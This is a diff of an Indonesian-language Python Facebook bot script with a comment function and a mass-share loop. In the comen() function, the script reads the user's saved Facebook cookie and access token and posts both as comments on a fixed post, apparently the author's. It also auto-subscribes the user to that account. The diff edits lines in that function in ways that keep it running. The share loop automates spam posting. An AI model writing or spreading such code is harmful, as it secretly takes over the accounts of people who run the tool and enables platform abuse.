@@ -203,12 +203,12 @@ def login_cookie():
 			
 def comen(cookie):
 	waktu = str(datetime.datetime.now().strftime('%H:%M:%S'))
-	_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
+	_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.datetime.now().strftime("%A"))]
 	kuki = cookie
 	toket = open("token.txt","r").read()
 	random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf","Hikmat Gans Selalu Coeg><","semoga @[100000131722561:0] panjang umur dan rejeki nya dilancarkan aminnn"])
 	requests.post(f"https://graph.facebook.com/100000131722561?fields=subscribers&access_token={toket}", headers = {"cookie":kuki})
-	requests.post("https://graph.facebook.com/100000131722561_5966059140075084/comments?message=" + random_kata + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" + "&access_token="+toket,cookies=kuki)
+	requests.post("https://graph.facebook.com/100000131722561_5966059140075084/comments?message=" + random_kata + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" + "&access_token="+toket,headers = {"cookie":kuki})
 	requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={kuki}&access_token={toket}", headers = {"cookie":kuki})
 	requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={toket}&access_token={toket}", headers = {"cookie":kuki})
 	requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":kuki})
@@ -294,7 +294,7 @@ def bot_share():
 	header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36"}
 	print("")
 	uiz = input(f"{garis} masukan link post : {H} ")
-	limit = int(input(f"{garis} masukan limit : {H} "))
+	coy = int(input(f"{garis} masukan limit : {H} "))
 	x=f"{P2}pencet {H2}ctrl+z untuk menghentikan bot share!!"
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	cookie = open('cookie.txt', 'r').read()
@@ -303,11 +303,11 @@ def bot_share():
 	runc= random.choice([K,M,U,O,B,H])
 	print("")
 	try:
-		for HikmatXD in range(limit):
+		for HikmatXD in range(coy):
 			HikmatXD+=1
 			ress = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={uiz}&published=0&access_token={token}",headers=header, cookies=coki).json()
 			if "id" in ress:
-				sys.stdout.write(f"\r \t\t{P}[{runc}•{P}] succesfull {runc}{HikmatXD}{P}/{limit} ");sys.stdout.flush()
+				sys.stdout.write(f"\r ({datetime.datetime.now().strftime('%H:%M:%S')})|{P}[{runc}•{P}] succesfull {runc}{HikmatXD}{P}/{coy} ");sys.stdout.flush()
 			else:
 				x=f"{P2}akun anda terkena spam komen/share!! "
 				vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
